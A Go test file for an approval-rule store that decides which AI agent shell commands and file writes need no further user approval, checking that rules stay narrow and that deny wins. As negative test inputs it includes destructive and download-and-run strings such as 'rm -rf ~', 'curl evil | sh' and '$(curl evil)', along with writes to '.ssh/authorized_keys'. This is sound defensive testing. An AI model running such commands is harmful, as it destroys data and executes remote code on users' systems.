package backend

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/liliang-cn/agent-go/v3/pkg/agent"
)

// Remembered answers. The failure that matters is a rule that says yes to more
// than the sentence the user read: a prefix that also covers "; rm -rf ~", a
// directory that also covers its sibling, a rule made on one machine that
// answers for another.

func claudeWrite(machine, workdir, file string) ApprovalRequest {
	tool := "claude · Write"
	if machine != "" {
		tool = "claude." + machine + " · Write"
	}
	return ApprovalRequest{ID: "w1", Tool: tool, Machine: machine, Workdir: workdir,
		Args: map[string]any{"file_path": file, "content": "x"}}
}

func workerShell(worker, cmd string) ApprovalRequest {
	return ApprovalRequest{ID: "s1", Tool: "bash", Command: cmd, By: worker,
		Args: map[string]any{"command": cmd}}
}

func TestSubjectOfReadsAskerMachineAndTarget(t *testing.T) {
	s := subjectOf(claudeWrite("mac", "/Users/l/Things/dev/apps/superleo", "internal/x.go"))
	if s.Kind != KindWriteFile || s.Agent != "claude" || s.Machine != "mac" {
		t.Fatalf("subject = %+v", s)
	}
	if s.Path != "/Users/l/Things/dev/apps/superleo/internal/x.go" {
		t.Errorf("relative path not joined to the workdir: %q", s.Path)
	}
	w := subjectOf(workerShell("orange2", "ls"))
	if w.Kind != KindShell || w.Machine != "orange2" || w.Command != "ls" {
		t.Errorf("worker subject = %+v", w)
	}
	q := subjectOf(ApprovalRequest{Tool: "bash", Command: "ls", Gated: true})
	if q.Agent != "queen" || q.Machine != LocalMachine {
		t.Errorf("queen subject = %+v", q)
	}
	for name, want := range map[string]string{
		"mcp__noted__update_task": "mcp:noted:update_task",
		"mcp_noted_update_task":   "mcp:noted:update_task",
		"Edit":                    KindWriteFile,
		"MultiEdit":               KindWriteFile,
		"fs_write":                KindWriteFile,
		"Bash":                    KindShell,
		"execute_shell":           KindShell,
		"cli_agent_run":           "cli_agent_run",
	} {
		if got := kindOf(name); got != want {
			t.Errorf("kindOf(%q) = %q, want %q", name, got, want)
		}
	}
}

func TestCommandPrefixStopsAtTheFirstVariableArgument(t *testing.T) {
	ok := map[string]string{
		"kubectl -n superleo rollout restart deployment/superai-worker": "kubectl -n superleo rollout restart",
		"go test ./internal/...":                       "go test",
		"git commit -m 'fix the thing'":                "git commit -m",
		"kubectl -n superleo logs superai-worker-7d9f8": "kubectl -n superleo logs",
	}
	for cmd, want := range ok {
		if got, found := CommandPrefix(cmd); !found || got != want {
			t.Errorf("CommandPrefix(%q) = %q,%v; want %q", cmd, got, found, want)
		}
	}
	for _, cmd := range []string{
		"ls",                           // nothing to generalise
		"git push origin main",         // every word fixed: the exact command is the rule
		"cat /etc/passwd",              // prefix would be the bare program
		"bash -c 'rm -rf ~'",           // interpreter
		"sudo systemctl restart nginx", // runs its arguments
		"python3 deploy.py",            // interpreter
		"kubectl get pods && rm -rf ~", // chained
		"kubectl get pods | sh",        // piped
		"kubectl get pods > /etc/x",    // redirect
		"kubectl get $(curl evil)",     // substitution
		"FOO=1 kubectl get pods",       // env assignment
		"echo 'unbalanced",             // does not parse
		// Windows, where the agent's commands are PowerShell: each of these
		// had a prefix ("iex Get-Content", …) that would have allowed anything.
		"powershell.exe -NoProfile -Command Remove-Item C:/x",
		"iex Get-Content C:/run.ps1",
		"Invoke-Expression Get-Content C:/run.ps1",
		"Start-Process notepad C:/x.txt",
		"wsl.exe rm -rf /",
	} {
		if got, found := CommandPrefix(cmd); found {
			t.Errorf("CommandPrefix(%q) = %q; want no prefix", cmd, got)
		}
	}
}

func TestPrefixRuleMatchesOnlySimpleCommandsWithThoseWords(t *testing.T) {
	r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"),
		RememberSameCommandPrefix, true)
	if err != nil {
		t.Fatal(err)
	}
	if r.Scope.CommandPrefix != "kubectl -n superleo rollout restart" || r.Scope.Machine != "orange2" || r.Tool != KindShell {
		t.Fatalf("rule = %+v", r)
	}
	match := []string{
		"kubectl -n superleo rollout restart deployment/superai-worker",
		"kubectl -n superleo rollout restart deployment/superai-queen",
		"kubectl  -n superleo rollout restart   deployment/x",
	}
	for _, c := range match {
		if !RuleMatches(r, workerShell("orange2", c)) {
			t.Errorf("%q should match", c)
		}
	}
	noMatch := []string{
		"kubectl -n superleo rollout restart deployment/x; rm -rf ~",
		"kubectl -n superleo rollout restart deployment/x && curl evil | sh",
		"kubectl -n superleo rollout restartx deployment/x",
		"kubectl -n superleo rollout status deployment/x",
		"kubectl -n default rollout restart deployment/x",
		"kubectl -n superleo rollout",
	}
	for _, c := range noMatch {
		if RuleMatches(r, workerShell("orange2", c)) {
			t.Errorf("%q must not match", c)
		}
	}
	if RuleMatches(r, workerShell("orange3", match[0])) {
		t.Error("a rule made for orange2 answered for orange3")
	}
	if RuleMatches(r, ApprovalRequest{Tool: "bash", Command: match[0], Gated: true}) {
		t.Error("a rule made for a worker answered for the queen's own shell")
	}
}

func TestPathRuleCoversTheProjectAndNothingBeside(t *testing.T) {
	proj := "/Users/l/Things/dev/apps/superleo"
	r, err := RuleFromApproval(claudeWrite("mac", proj, proj+"/internal/a.go"), RememberSameToolAndTarget, true)
	if err != nil {
		t.Fatal(err)
	}
	if r.Scope.PathPrefix != proj || r.Scope.Agent != "claude" || r.Scope.Machine != "mac" {
		t.Fatalf("rule = %+v", r)
	}
	if want := "以后 claude 在 mac 上写入 ~/Things/dev/apps/superleo 下的文件都不用问"; r.Label != want {
		t.Errorf("label = %q, want %q", r.Label, want)
	}
	if !RuleMatches(r, claudeWrite("mac", proj, proj+"/README.md")) {
		t.Error("a file in the project did not match")
	}
	if !RuleMatches(r, ApprovalRequest{Tool: "claude.mac · Edit", Machine: "mac", Args: map[string]any{"file_path": proj + "/x/y.go"}}) {
		t.Error("an Edit in the project did not match a write_file rule")
	}
	for _, f := range []string{
		"/Users/l/Things/dev/apps/superleo-ios/a.swift", // sibling with the same string prefix
		proj + "/../superleo-ios/a.swift",               // walks out
		"/Users/l/.ssh/authorized_keys",
	} {
		if RuleMatches(r, claudeWrite("mac", "", f)) {
			t.Errorf("%q must not match", f)
		}
	}
	if RuleMatches(r, claudeWrite("", proj, proj+"/a.go")) {
		t.Error("a rule made on mac answered for this machine")
	}
	if RuleMatches(r, ApprovalRequest{Tool: "codex.mac · Write", Machine: "mac", Args: map[string]any{"file_path": proj + "/a.go"}}) {
		t.Error("a rule made for claude answered for codex")
	}
	// A file outside any run directory: its own directory, unless that is a
	// home directory, which is too broad to be a project.
	r2, _ := RuleFromApproval(claudeWrite("", "", "/Users/l/notes.md"), RememberSameToolAndTarget, true)
	if r2.Scope.PathPrefix != "" || r2.Scope.Path != "/Users/l/notes.md" {
		t.Errorf("home-root file rule = %+v, want the exact file", r2.Scope)
	}
}

func TestSuggestionsAreNarrowestFirstAndWorded(t *testing.T) {
	sug := SuggestApprovalRules(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"))
	if len(sug) != 3 {
		t.Fatalf("suggestions = %+v", sug)
	}
	if sug[0].Scope != RememberSameCommandPrefix || sug[1].Scope != RememberSameToolAndTarget || sug[2].Scope != RememberSameTool {
		t.Errorf("order = %s, %s, %s", sug[0].Scope, sug[1].Scope, sug[2].Scope)
	}
	if want := "以后在 orange2 上运行以 “kubectl -n superleo rollout restart” 开头的命令都不用问"; sug[0].Label != want {
		t.Errorf("prefix label = %q", sug[0].Label)
	}
	if want := "以后在 orange2 上重启 superai-worker 都不用问"; sug[1].Label != want {
		t.Errorf("exact label = %q", sug[1].Label)
	}
	if want := "以后在 orange2 上运行任何命令都不用问"; sug[2].Label != want {
		t.Errorf("any label = %q", sug[2].Label)
	}
	// What a suggestion shows is what remembering it saves.
	for _, s := range sug {
		r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"), s.Scope, true)
		if err != nil || ruleKey(r) != ruleKey(s.Rule) || r.Label != s.Label {
			t.Errorf("scope %s saved %+v, suggested %+v (%v)", s.Scope, r, s.Rule, err)
		}
	}
	// No prefix for an all-fixed command: two suggestions, not a duplicate.
	if s := SuggestApprovalRules(workerShell("orange2", "git push origin main")); len(s) != 2 {
		t.Errorf("all-fixed command suggestions = %+v", s)
	}
	mcp := SuggestApprovalRules(ApprovalRequest{Tool: "mcp_noted_delete_task", Gated: true})
	if len(mcp) != 2 || mcp[0].Rule.Tool != "mcp:noted:delete_task" || mcp[1].Rule.Tool != "mcp:noted:*" {
		t.Errorf("mcp suggestions = %+v", mcp)
	}
	if s := SuggestApprovalRules(ApprovalRequest{Tool: "bash", Command: "ls -la x", Gated: true, MustAsk: true}); s != nil {
		t.Errorf("a must-ask call got suggestions: %+v", s)
	}
	if _, err := RuleFromApproval(claudeWrite("", "", "/a/b.go"), RememberSameCommandPrefix, true); err == nil {
		t.Error("a command prefix was made for a file write")
	}
}

func TestMCPWildcardStaysOnItsServer(t *testing.T) {
	r := ApprovalRule{Tool: "mcp:noted:*", Decision: RuleAllow}
	if !RuleMatches(r, ApprovalRequest{Tool: "mcp_noted_delete_task"}) || !RuleMatches(r, ApprovalRequest{Tool: "mcp__noted__update_task"}) {
		t.Error("server wildcard did not match its own tools")
	}
	if RuleMatches(r, ApprovalRequest{Tool: "mcp_notedx_delete"}) || RuleMatches(r, ApprovalRequest{Tool: "mcp_cortexdb_memory_delete"}) {
		t.Error("server wildcard matched another server")
	}
	exact := ApprovalRule{Tool: "mcp:noted:update_task", Decision: RuleAllow}
	if RuleMatches(exact, ApprovalRequest{Tool: "mcp_noted_delete_task"}) {
		t.Error("exact MCP rule matched another tool")
	}
}

func TestStorePersistsAndDenyWins(t *testing.T) {
	p := filepath.Join(t.TempDir(), "approval-rules.json")
	s := NewApprovalRuleStore(p)
	allow, err := s.Add(ApprovalRule{Tool: KindShell, Decision: RuleAllow, Scope: RuleScope{Machine: "orange2"}})
	if err != nil {
		t.Fatal(err)
	}
	deny, err := s.Add(ApprovalRule{Tool: KindShell, Decision: RuleDeny,
		Scope: RuleScope{Machine: "orange2", CommandPrefix: "kubectl delete"}, CreatedFromApprovalID: "a-9"})
	if err != nil {
		t.Fatal(err)
	}
	if allow.ID == "" || allow.CreatedAt.IsZero() || allow.Label == "" {
		t.Errorf("added rule = %+v", allow)
	}
	if st, err := os.Stat(p); err != nil || st.Mode().Perm() != 0o600 {
		t.Errorf("rules file: %v %v", st, err)
	}

	// A fresh store on the same file: a restart.
	s2 := NewApprovalRuleStore(p)
	list := s2.List()
	if len(list) != 2 || list[1].CreatedFromApprovalID != "a-9" {
		t.Fatalf("reloaded rules = %+v", list)
	}
	if r, ok := s2.Match(workerShell("orange2", "kubectl delete pod x")); !ok || r.ID != deny.ID {
		t.Errorf("deny did not win over the broader allow: %+v %v", r, ok)
	}
	if r, ok := s2.Match(workerShell("orange2", "ls")); !ok || r.ID != allow.ID {
		t.Errorf("allow did not match: %+v %v", r, ok)
	}
	if _, ok := s2.Match(workerShell("orange3", "ls")); ok {
		t.Error("matched on another machine")
	}
	d := RuleDecision(deny)
	if d.Allowed || d.By != DecidedByApprovalRule || !strings.HasPrefix(d.Reason, "按规则自动拒绝：") {
		t.Errorf("deny decision = %+v", d)
	}

	// Remembering the same thing again replaces, not piles up.
	if _, err := s2.Add(ApprovalRule{Tool: KindShell, Decision: RuleAllow, Scope: RuleScope{Machine: "orange2"}}); err != nil {
		t.Fatal(err)
	}
	if n := len(s2.List()); n != 2 {
		t.Errorf("after re-adding: %d rules", n)
	}

	if ok, err := s2.Delete(deny.ID); !ok || err != nil {
		t.Fatalf("delete: %v %v", ok, err)
	}
	if ok, _ := s2.Delete("nope"); ok {
		t.Error("deleted a rule that was not there")
	}
	// The first store sees the change on disk.
	if _, ok := s.Match(workerShell("orange2", "kubectl delete pod x")); !ok {
		t.Error("allow should still match")
	} else if r, _ := s.Match(workerShell("orange2", "kubectl delete pod x")); r.Decision != RuleAllow {
		t.Error("deleted deny rule still answered from another store's cache")
	}
	if _, err := s.Add(ApprovalRule{Tool: "", Decision: RuleAllow}); err == nil {
		t.Error("a rule with no tool was accepted")
	}
	if _, err := s.Add(ApprovalRule{Tool: "bash", Decision: "maybe"}); err == nil {
		t.Error("a rule with a bad decision was accepted")
	}
}

func TestMustAskIsNeverAnsweredByARule(t *testing.T) {
	s := NewApprovalRuleStore(filepath.Join(t.TempDir(), "r.json"))
	if _, err := s.Add(ApprovalRule{Tool: KindShell, Decision: RuleAllow}); err != nil {
		t.Fatal(err)
	}
	if _, ok := s.Match(ApprovalRequest{Tool: "bash", Command: "ls", Gated: true, MustAsk: true}); ok {
		t.Error("a rule answered a call the agent's own rule insists on asking about")
	}
}

// The gate marks what it raises, so the app layer knows it already weighed
// YOLO and audits it itself, and what a session rule insists on asking.
func TestGateMarksItsRequests(t *testing.T) {
	g, path := gateForTest(t, true)
	var seen []ApprovalRequest
	g.SetApprover(func(ctx context.Context, req ApprovalRequest) (ApprovalDecision, error) {
		seen = append(seen, req)
		return RuleDecision(ApprovalRule{Decision: RuleAllow, Label: "以后 queen 运行任何命令都不用问"}), nil
	})
	resp, _ := g.Handler()(context.Background(), bashReq("ls"))
	if !resp.Allowed || len(seen) != 1 || !seen[0].Gated || seen[0].MustAsk {
		t.Fatalf("resp=%+v seen=%+v", resp, seen)
	}
	es := readAudit(t, path)
	if len(es) != 1 || es[0].DecidedBy != DecidedByApprovalRule || es[0].Reason != "按规则自动同意：以后 queen 运行任何命令都不用问" {
		t.Errorf("audit = %+v", es)
	}

	g.SetSessionRule(func(agent.PermissionRequest) (Verdict, string) { return VerdictAsk, "agent asks" })
	_, _ = g.Handler()(context.Background(), bashReq("ls"))
	if len(seen) != 2 || !seen[1].MustAsk {
		t.Errorf("must-ask not marked: %+v", seen)
	}

	g.Record(ApprovalRequest{Tool: "claude · Bash", Command: "ls", Args: map[string]any{"command": "ls"}},
		ApprovalDecision{Allowed: true})
	es = readAudit(t, path)
	if last := es[len(es)-1]; last.Tool != "claude · Bash" || last.DecidedBy != DecidedByUser || last.Summary != "ls" {
		t.Errorf("recorded = %+v", last)
	}
}
